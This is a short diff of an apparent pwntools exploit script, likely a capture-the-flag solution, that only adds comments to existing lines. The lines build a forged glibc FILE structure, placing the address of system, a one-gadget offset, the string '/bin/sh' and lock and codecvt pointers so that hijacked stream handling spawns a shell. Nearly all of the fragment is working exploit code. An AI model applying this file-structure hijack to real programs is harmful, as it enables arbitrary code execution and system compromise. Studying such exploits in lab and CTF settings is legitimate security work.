@@ -89,8 +89,8 @@ def exploit(io,e,l):
 
     # create a fake file struct to use when calling the write stream
     file = FileStructure()
-    file._IO_read_end = l.sym["system"] + libc
-    file._IO_save_base = libc + 0x163830 # one gadget
+    file._IO_read_end = l.sym["system"] + libc # it needs a value in here
+    file._IO_save_base = libc + 0x163830 # one gadget <======== this gets called
     file._IO_write_end = u64(b"/bin/sh\x00")
     file._lock = libc + 0x21ba70
     file._codecvt = l.sym["_IO_2_1_stdout_"] + libc + 0xb8
